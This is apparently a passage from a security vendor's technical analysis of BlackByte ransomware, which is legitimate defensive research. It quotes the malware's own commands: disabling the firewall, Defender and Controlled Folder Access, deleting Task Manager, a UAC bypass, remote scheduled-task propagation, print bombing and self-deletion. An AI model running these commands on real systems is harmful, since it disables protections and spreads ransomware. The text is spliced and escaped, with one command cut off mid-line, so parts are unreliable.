<p><img height="679" src="https://lh6.googleusercontent.com/bXxKZFRFKbevScsHQB-LC_Uuqy99xq26Y8kcVIqoJ9CAy_lZLD1xhhdXGOAay7-hea4NhGzNSrP_lDaLW9xz_BWwRkoJcAREwk78F2DhHChHH_18EDYdZPS28J0O6C8PZjvF727M" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 5. BlackByte v2 file encryption algorithm</p>

<p>The threat actor can use the file&#x27;s public key together with the threat actor&#x27;s secret key to recover the shared secret and use it to decrypt the encrypted data as follows:</p>

<p>shared_secret = Curve25519(blackbyte_secret_key, file_public_key)</p>

<p>The following Python code in Figure 6 can be used to decrypt BlackByte encrypted data from a file that has been encrypted if the threat actor&#x27;s private key is obtained:</p>

<p><img height="316" src="https://lh4.googleusercontent.com/lzAioCBczEag8bLRx9tr1nsZzc6LZPLIkpm8gLofNTrl7jhGX4Mf5YsXS7nDwfpRkrx7Ey8wdiS_xunhT0PNl5berPATpImPnvxKIjTNZNzilmGjShmVg-wzG-5N82_cMVSlTUqD" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 6. Python code to decrypt BlackByte v2 files with the threat actor&#x27;s private key</p>

<p>BlackByte v2 also encrypts the filename after encryption. The encryption is a simple XOR layer with a hardcoded key, followed by Base64 encoding as shown in Figure 7.</p>

<p><img alt="Filename Encryption" data-align="left" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/blackbyte/build_enc_filename.png" loading="lazy" decoding="async"/></p>

<p>Figure 7. BlackByte v2 filename encryption</p>

<p>In the analyzed sample, the XOR key was <em>fuckyou123</em>. After a filename has been encrypted, the file is renamed and the .blackbyte extension is concatenated.</p>

<p>ThreatLabz has implemented proof-of-concept file decryption code for both BlackByte v1 and v2 <a href="https://github.com/threatlabz/tools">here</a>.</p>

<p> </p>

<h3>Ransom Note and BlackByte Icon (Variant 2)</h3>

<p>BlackByte v2 introduced some improvements to storing the ransom note and icon file. The Base64 encoded blocks for the ransom note and icon file added an XOR-based encryption layer. The XOR key to decrypt the ransom note and icon file is embedded in the ransomware as an obfuscated string. The icon file is written to the victim&#x27;s <em>%APPDATA%</em> directory using a randomly generated filename consisting of six upper and lowercase alphabetic and numeric characters (e.g., <em>i2uOJh.ico</em>).</p>

<p>BlackByte v2 contains a hardcoded TOR onion URL and path for the victim portal rather than relying on the command-line for the path value. BlackByte v2 also added a hardcoded password that is required to access the victim ransom portal. An example password is:</p>

<pre>
<strong>gkaW_#DD[Aw_JTB@luXpJBdye6eLr@{bx5pHFA)T5FpMYJC]f|@</strong></pre>

<p>The BlackByte v2 ransom note template is shown below in Figure 8. The <strong>[LINK]</strong> substring in the ransom note is replaced with the hardcoded BlackByte victim URL and the <strong>[PASSW]</strong> substring is replaced with the victim-specific password for the ransom portal.</p>

<p> </p>

<p><img height="400" src="https://lh5.googleusercontent.com/sw0iG6WGVHRRM7NQsTjmt1ut60TH-_VPe1Fo57XuYeBOMw9PrvI4lCqyCPueiEXvbAZ-ks3KHXmnS81JvGYaMf31tSL1Eejx-BZ973EctAqjb-u3R6k-9UC0GqhkLQxgMC6lqtp7" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 8. BlackByte v2 ransom note template</p>

<p> </p>

<p>An example ransom note when populated after file encryption has been performed for BlackByte v2 is shown in Figure 9.</p>

<p><img alt="V2 Ransom Note" data-align="center" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/blackbyte/v2_ransom_note.png" loading="lazy" decoding="async"/></p>

<p>Figure 9. BlackByte v2 ransom note</p>

<p>A copy of the BlackByte v2 ransom note can be found in the <a href="https://github.com/threatlabz/ransomware_notes">ThreatLabz GitHub repository</a>. After BlackByte encrypts files, the ransom note is written to each directory, the encrypted files are renamed, and their icons are replaced by the BlackByte icon.</p>

<p> </p>

<h2>Ransom Portal and Leak Site</h2>

<p>When a victim accesses the link in the ransom portal, they are instructed to enter the access key from the ransom note as shown in Figure 10.</p>

<p><img alt="V2 Negotiation Channel" data-align="center" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/blackbyte/V2%20negotiation%20channel.png" loading="lazy" decoding="async"/></p>

<p>Figure 10. BlackByte victim ransom portal</p>

<p>After a victim authenticates, they are provided the ransom demand and instructions how to purchase Bitcoin. There is also a live chat feature as shown in Figure 11.</p>

<p><img height="381" src="https://lh4.googleusercontent.com/DLnqSyLlOWxSxUN3Fk4utE8YDUD_rno8CpTDQzJfxSGSA0FDqA7kFOERJEcvKCPeR5QupY4KX7Bh9Ik2sCq70KdMXfpaey_HnpSkvW8jG5EK7aRlzg8Gf1X5mxrxTDXOk3KhKjqy" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 11. BlackByte ransom negotiation portal</p>

<p>Victims are further pressured to pay the ransom, or risk having their data publicly leaked on their TOR hidden service as shown in Figure 12.</p>

<p><img height="380" src="https://lh3.googleusercontent.com/OejqNE6SEL6jkFTbSPPvFiB2UjZnONXQEujIzfOe70E8Q8bI18riVB8v41-bU4nWYh6Y7nUJq012p9IVLMKCi2w3w3ohorkg9VIu_8Oi3qFu8dsc3ApLjUBLBvGdZK3_2eXVV4e1" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 12. BlackByte victim leak site</p>

<p> </p>

<h2>Print Bombing</h2>

<p>In addition to dropping a ransom note on the victim&#x27;s machine, the ransomware sends a message to be printed by any connected printers. The printed ransom message is an RTF file with the content shown below:</p>

<p> </p>

<table><tbody><tr><td>
			<pre>
{\rtf1\ansi\ansicpg1251\deff0\nouicompat\deflang1049{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 10.0.19041}\viewkind4\uc1 
\pard\sa200\sl276\slmult1\qc\f0\fs56\lang9 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par
\fs56 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par
\fs56 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par
\fs56 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par
\fs56 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par
\fs56 Your HACKED by BlackByte team.\par
Connect us to restore your system.\fs22\par

\pard\sa200\sl276\slmult1\par
}</pre>
			</td></tr></tbody></table>

<p> </p>

<p>In BlackByte v1, the message is written to the file <em>C:\Users\tree.dll</em> and the following command is executed to print it:</p>

<pre>
<strong>C:\\Windows\\System32\\cmd.exe /c for /l %x in (1,1 ,75) do start wordpad.exe /p C:\\Users\\tree.dll</strong></pre>

<p>In addition, a task named <em>Task</em> is created to print the message every hour:</p>

<pre>
<strong>C:\WINDOWS\system32\schtasks.exe /create /np /sc HOURLY /tn Task /tr &quot;C:\Windows\System32\cmd.exe 
/c for /l %x in (1,1,75) do start wordpad.exe /p C:\Users\tree.dll&quot; /st 07:00</strong></pre>

<p>In BlackByte v2, the text of the message is written to a file with a random name consisting of six upper and lowercase alphabetic and numeric characters. The task name is also created randomly consisting of eight upper and lowercase alphabetic and numeric characters. An example task command to print the ransom message is shown below:</p>

<pre>
<strong>C:\WINDOWS\system32\schtasks.exe /create /np /sc HOURLY /tn 4y77VPNo /tr &quot;C:\Windows\System32\cmd.exe 
/c for /l %x in (1,1,75) do start %SystemDrive%\Program Files\Windows NT\Accessories\WordPad.exe /p 
C:\Users\1HoWkK.dll&quot; /st 07:00</strong>
</pre>

<p> </p>

<h2>Anti-Analysis / Anti-Forensics Techniques</h2>

<h3>String Obfuscation</h3>

<p>Both Go-based BlackByte variants encrypt most strings using a tool similar to <a href="https://github.com/andrivet/ADVobfuscator">AdvObfuscator</a>. Each string is decrypted using a unique algorithm with polymorphic code that implements different operations <em>xor</em>, <em>addition</em>, <em>subtraction</em>, etc. In the examples below, the encrypted strings in Figure 13 are built and decrypted from arguments on the stack.</p>

<p><img height="601" src="https://lh4.googleusercontent.com/nkxvy5vrno0HEs_u0QYAeOlR1kapi-Txh0cokyRwRCAtxw4LSY5D-Jm4TU8OWTyHMvCM5Xesw-ZpLQumZLWDBhiu8tj89kfrpYXKHZspY0pG-DzJd7J2w9K5ezry7_UWcxktHKwV" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 13. BlackByte string obfuscation examples</p>

<p> </p>

<h3>Modified UPX Packer</h3>

<p>In addition to string obfuscation, BlackByte samples are typically packed with <a href="https://upx.github.io/">UPX</a>. In BlackByte v1, all of the samples observed by ThreatLabz were packed with the standard UPX packer and could be unpacked via the command-line parameter <em>-d</em>. The early samples of BlackByte v2 were also packed with the standard UPX packer. However, the most recent BlackByte samples (since March 2022) are packed with a modified version of UPX. The names of the sections have been renamed from <em>UPX0</em> and <em>UPX1</em> to <em>BB0</em> and <em>BB1</em>, respectively. Figure 14 shows an example BlackByte v2 sample with the modified UPX headers.</p>

<p><img alt="Altered UPX Header" data-align="center" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/blackbyte/modified_upx_headers.png" loading="lazy" decoding="async"/></p>

<p>Figure 14. BlackByte v2 altered UPX header</p>

<ul>
</ul>

<h2>Antivirus Detection</h2>

<p>Due to BlackByte&#x27;s anti-analysis features, polymorphic code, and heavy obfuscation many antivirus products have very low detection rates. For example, the BlackByte sample with the SHA256 <em>534f5fbb7669803812781e43c30083e9197d03f97f0d860ae7d9a59c0484ace4</em> has an antivirus detection rate of 4/61 at the time of publication.</p>

<p> </p>

<ul>
</ul>

<h2 class="wysiwyg_module_h1__mOSH6">Conclusion</h2>

<p>BlackByte is a full-featured ransomware family operated by a threat group that continues to breach organizations and demand large ransom amounts. The threat group also performs double extortion attacks by stealing an organization&#x27;s files and leaking them online if the ransom is not paid. The ransomware code itself is regularly updated to fix bugs, bypass security software, and hinder malware analysis. The encryption algorithms have also been improved to be more secure and prevent file recovery. This demonstrates that the threat group will likely continue to improve the ransomware and remain a significant threat to organizations.</p>

<p> </p>

<p>Zscaler&#x27;s multilayered cloud security platform detects indicators at various levels, as shown below:</p>

Points\u003c/h1\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003eBlackByte is a full-featured ransomware family that first emerged around July 2021\u003c/li\u003e\r\n\t\u003cli\u003eThe ransomware was originally written in C# and later redeveloped in the Go programming language around September 2021\u003c/li\u003e\r\n\t\u003cli\u003eThe threat group exfiltrates data prior to deploying ransomware and leaks the stolen information if a ransom is not paid\u003c/li\u003e\r\n\t\u003cli\u003eThe group has demanded multi-million dollar ransoms from some victims\u003c/li\u003e\r\n\t\u003cli\u003eBlackByte ransomware employs various anti-analysis techniques including a multitude of dynamic string obfuscation algorithms\u003c/li\u003e\r\n\t\u003cli\u003eIn early versions of the ransomware, file encryption utilized a hardcoded 1,024-bit RSA public key along with a 128-bit AES key that was derived from a file retrieved from a command and control server\u003c/li\u003e\r\n\t\u003cli\u003eMore recent BlackByte versions use Curve25519 Elliptic Curve Cryptography (ECC) for asymmetric encryption and ChaCha20 for symmetric file encryption\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch1\u003eIntroduction\u003c/h1\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eBlackByte\u003c/em\u003e is a Ransomware-as-a-Service (RaaS) group that has been targeting corporations worldwide since July 2021. \u003ca href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/\"\u003ePrevious versions of the ransomware\u003c/a\u003e were written in C#. More recently, the authors redeveloped the ransomware using the Go programming language. The BlackByte Go variant was used in attacks described in an \u003ca href=\"https://www.ic3.gov/Media/News/2022/220211.pdf\"\u003eFBI advisory\u003c/a\u003e that warned BlackByte had compromised numerous businesses, including entities in US critical infrastructure sectors. In this post, Zscaler ThreatLabz analyzes two variants of the Go-based implementation of BlackByte ransomware.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch1\u003eTechnical Analysis\u003c/h1\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch2\u003eVariants\u003c/h2\u003e\r\n\r\n\u003cp\u003eThreatLabz has identified two variants of the Go-based variant of BlackByte. The first variant was seen in-the-wild around September 2021 and shares many similarities with the C# version including the commands executed to perform lateral propagation, privilege escalation, and file encryption algorithms. A more recent Go-based variant was introduced around February 2022. This new variant introduced many additional features and updated the file encryption algorithms. In this blog, for brevity, the Go-based BlackByte variant 1 will be referred to as BlackByte v1 and the second variant will be referred to as BlackByte v2.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch2\u003eInitialization\u003c/h2\u003e\r\n\r\n\u003cp\u003eBefore BlackByte performs file encryption, the ransomware first performs initialization. Most of these initialization functions are very similar or identical to the C# variant of BlackByte.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eMutex Creation\u003c/h3\u003e\r\n\r\n\u003cp\u003eBlackByte creates a mutex using a value that is hardcoded in the malware, for example: \u003cem\u003eGlobal\\7b55551e-a59c-4252-a34a-5c80372b3014\u003c/em\u003e. If the mutex exists, BlackByte will terminate. This ensures that there is only one active instance of BlackByte running at a time.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eIdentify System Language\u003c/h3\u003e\r\n\r\n\u003cp\u003eBlackByte ransomware resolves the victim's system language by comparing the language ID values with those shown in Table 1. If the system language matches any from this list, BlackByte will exit without performing file encryption.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cdiv\u003e\r\n\u003ctable\u003e\r\n\t\u003ctbody\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e\u003cstrong\u003eLanguage ID\u003c/strong\u003e\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e\u003cstrong\u003eLanguage\u003c/strong\u003e\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1049\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eRussian\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1058\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eUkrainian\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1059\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eBelarusian\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1064\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eTajik\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1067\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eArmenian\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1068\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eAzerbaijani Latin\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1079\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eGeorgian\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1087\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eKazakh\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1090\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eTurkmen\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e1091\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eUzbek Latin\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e2092\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eAzerbaijani Cyrillic\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\t\u003ctr\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003e2115\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\t\u003ctd\u003e\r\n\t\t\t\u003cp\u003eUzbek Cyrillic\u003c/p\u003e\r\n\t\t\t\u003c/td\u003e\r\n\t\t\u003c/tr\u003e\r\n\t\u003c/tbody\u003e\r\n\u003c/table\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003eTable 1. System languages avoided by BlackByte ransomware\u003c/p\u003e\r\n\r\n\u003cp\u003eThese languages are specifically avoided by BlackByte to prevent encrypting files on systems that are located in Commonwealth of Independent States (CIS) countries. This likely indicates that the threat actors behind BlackByte are located in Eastern Europe and/or Russia. This is designed to reduce the threat that local law enforcement in those regions will pursue criminal prosecution against those responsible for BlackByte.\u003c/p\u003e\r\n\u003c/div\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eEnable Long Paths\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe malware executes the following command to avoid issues that may occur when encrypting files with long path names:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\system32\\cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eDisable Controlled Folder Access\u003c/h3\u003e\r\n\r\n\u003cp\u003eBlackByte executes the following command to disable controlled folder access:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eSet-MpPreference -EnableControlledFolderAccess Disabled\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eThe Windows controlled folder access feature is designed to protect data from malicious applications such as ransomware. When enabled, files located in the specified protected folders can not be modified by unauthorized applications.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eDelete Shadow Copies\u003c/h3\u003e\r\n\r\n\u003cp\u003eSimilar to other ransomware families, BlackByte deletes shadow copies to prevent a victim from easily recovering files from backups. There are two methods that BlackByte uses to delete shadow copies. The first executes the following PowerShell command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003e$x = 3. Service names terminated by BlackByte ransomware\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eWindows Firewall\u003c/h3\u003e\r\n\r\n\u003cp\u003eBlackByte disables the Windows firewall via the command: \u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003enetsh advfirewall set allprofiles state off\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eWindows Defender\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe ransomware executes the following command to delete task manager, resource monitor, and stop the Windows Defender service:\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003ecmd /c del C:\\Windows\\System32\\Taskmgr.exe /f /q \u0026amp; del C:\\Windows\\System32\\resmon.exe /f /q \u0026amp;\u003cbr\u003e\r\npowershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String\u003cbr\u003e\r\n('V'+'wBp'+'A'+'G4AR'+'AB'+'lAG'+'YAZQBuAGQA'));Stop-Service -Name $x;Set-Service -StartupType Disabled \u003c/strong\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003eThe Base64 encoded string above decodes to \u003cem\u003eWinDefend\u003c/em\u003e.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003eRaccine Anti-Ransomware\u003c/h3\u003e\r\n\r\n\u003cp\u003eBlackByte terminates and uninstalls an anti-ransomware product known as Raccine. The Raccine processes that are terminated are \u003cem\u003eraccine.exe\u003c/em\u003e and \u003cem\u003eraccinesettings.exe\u003c/em\u003e. To uninstall Raccine, BlackByte deletes the following registry keys and values:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u003cstrong\u003eHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Raccine Tray\u003c/strong\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cstrong\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\Raccine\u003c/strong\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cstrong\u003eHKEY_CURRENT_USER\\SOFTWARE\\Raccine\u003c/strong\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cstrong\u003eHKEY_LOCAL_MACHINE\\SOFTWARE\\Raccine\u003c/strong\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eBlackByte then deletes Raccine's scheduled task via the command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\system32\\schtasks.exe /DELETE /TN \"\\\"Raccine Rules Updater\\\"\" /F\u003c/strong\u003e\r\n\u003c/pre\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003ePrivilege Escalation\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe ransomware executes the following commands to disable UAC remote restrictions:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\system32\\cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eBlackByte sets the \u003cem\u003eEnableLinkedConnections\u003c/em\u003e registry value to force symbolic links to be written to link logon sessions as follows:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\system32\\cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eIn BlackByte v2, an additional privilege escalation method was added that exploits the \u003ca href=\"https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512\"\u003e\u003cem\u003eCMSTPLUA\u003c/em\u003e COM interface to bypass UAC\u003c/a\u003e. The \u003cem\u003eShellExec\u003c/em\u003e method of the interface \u003cem\u003eICMLuaUtil\u003c/em\u003e can be invoked with arbitrary commands with elevated privileges using the ElevationMoniker \u003cstrong\u003eElevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u003c/strong\u003e. This allows BlackByte v2 to execute the \u003cem\u003esvchost.exe\u003c/em\u003e process that it injects into with elevated privileges. This privilege escalation technique has also been utilized by other \u003ca href=\"https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/\"\u003eransomware groups including REvil and LockBit\u003c/a\u003e.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch2\u003eLateral Propagation\u003c/h2\u003e\r\n\r\n\u003cp\u003eBlackByte ransomware performs network enumeration and can propagate across a local network. First it executes the following commands to enable network discovery and file and printer sharing:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\system32\\cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new enable=Yes\r\nC:\\WINDOWS\\system32\\cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new enable=Yes\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eThe following commands are then executed to discover other computers and network file shares:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003enet view\r\narp -a\u003c/strong\u003e\r\n\r\n\u003c/pre\u003e\r\n\r\n\u003cp\u003eBlackByte loads the Active Directory module RSAT-AD-PowerShell and queries for other computers via the following commands:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Install-WindowsFeature -Name \\\"RSAT-AD-PowerShell\\\" –IncludeAllSubFeature\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003epowershell -command \"Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | FT Name\"\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eIf the \u003cem\u003e-a\u003c/em\u003e flag is passed via the command-line, BlackByte attempts to copy itself to remote computer's public folders via the administrative share \u003cem\u003e\\\\\u0026lt;remote_computer_name\u0026gt;\\c$\\Users\\Public\\\u0026lt;filename.exe\u0026gt;\u003c/em\u003e. If that attempt is unsuccessful, BlackByte will default to the path: \u003cem\u003e\\\\\u0026lt;remote_computer_name\u0026gt;\\Users\\Public\\\u0026lt;filename.exe\u0026gt;\u003c/em\u003e. BlackByte uses the Windows task scheduler to execute the ransomware on the remote host using the following command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\Windows\\system32\\schtasks.exe /Create /S \u0026lt;remote_computername\u0026gt; /TN \u0026lt;taskname\u0026gt; /TR \"C:\\Users\\Public\\\u0026lt;filename\u0026gt; -s \u0026lt;passphrase\u0026gt;\" /ru SYSTEM /sc onlogon /RL HIGHEST /f\u003c/strong\u003e\r\n\r\n\u003c/pre\u003e\r\n\r\n\u003cp\u003eIn BlackByte v2, the filename and task name are pseudorandomly generated using a function that produces eight upper and lowercase alphabetic and numeric characters (e.g., \u003cem\u003eBqgDOVYL.exe\u003c/em\u003e and \u003cem\u003eKYL8EpE9\u003c/em\u003e, respectively). BlackByte v1 uses a hardcoded filename and command-line argument \u003cem\u003ecomplex.exe -single\u003c/em\u003e and the hardcoded task name \u003cem\u003easd\u003c/em\u003e.\u003c/p\u003e\r\n\r\n\u003cp\u003eAfter scheduling the task, the remote BlackByte binary is executed using the command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\Windows\\system32\\schtasks.exe /S \u0026lt;remote_computername\u0026gt; /Run /TN \u0026lt;taskname\u0026gt;\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eAfter the task is executed, BlackByte deletes the remote task using the command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\Windows\\system32\\schtasks.exe /Delete /S \u0026lt;remote_computername\u0026gt; /TN \u0026lt;taskname\u0026gt; /f\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eBlackByte then deletes the copy of itself on the remote host network share. BlackByte then deletes its original binary on disk by executing the command:\u003c/p\u003e\r\n\r\n\u003cpre\u003e\r\n\u003cstrong\u003eC:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 10 \u0026gt; Nul \u0026amp; Del \u0026lt;blackbyte_filepath.exe\u0026gt; /F /Q\u003c/strong\u003e\u003c/pre\u003e\r\n\r\n\u003cp\u003eThe ping command is used to delay the file deletion by 10 seconds. The process injection functionality may be able to bypass some security software 